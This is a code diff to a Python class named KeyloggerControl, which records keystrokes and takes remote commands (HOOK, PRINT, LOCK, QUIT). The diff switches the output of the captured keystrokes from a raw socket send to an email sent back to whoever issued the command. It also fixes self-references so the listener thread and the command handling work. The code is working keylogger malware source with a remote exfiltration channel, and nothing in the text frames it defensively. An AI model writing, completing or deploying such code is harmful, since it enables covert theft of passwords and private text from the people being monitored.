@@ -23,13 +23,13 @@ class KeyloggerControl:
             self.container += str(tmp)
         return
 
-    def _print(self, client):
-        client.sendall(bytes(cont, "utf8"))
+    def Print(self, data, emailTemplate):
+        emailTemplate.SendNotification(emailFrom = emailTemplate.userName , emailTo = data.From, subject = "[Noreply] Server Response", body = self.container)
         self.container = " "
         return
     
     def Listen(self):
-        with Listener(on_press = keylogger) as listener:
+        with Listener(on_press = self.Keylogger) as listener:
             listener.join()  
         return
     
@@ -44,27 +44,27 @@ class KeyloggerControl:
             self.isLock = 0
         return
     
-    def KeyloggerHandle(self, data):
+    def KeyloggerHandle(self, data, emailTemplate):
         self.isLock = 0
         self.isHook = 0
         self.flag = 0
         self.container = " "
         self.msg = ""
-        threading.Thread(target = listen).start() 
+        threading.Thread(target = self.Listen).start() 
 
         while True:
             if "HOOK" in data:
-                if ishook == 0:
-                    flag = 1
-                    ishook = 1
+                if self.ishook == 0:
+                    self.flag = 1
+                    self.ishook = 1
                 else:
-                    flag = 2
-                    ishook = 0
+                    self.flag = 2
+                    self.ishook = 0
             elif "PRINT" in data:
-                _print(client)
+                self.Print(data, emailTemplate)
             elif "LOCK" in data:
-                lock()
+                self.Lock()
             elif "QUIT" in data:
-                flag = 4
+                self.flag = 4
                 return    
         return 
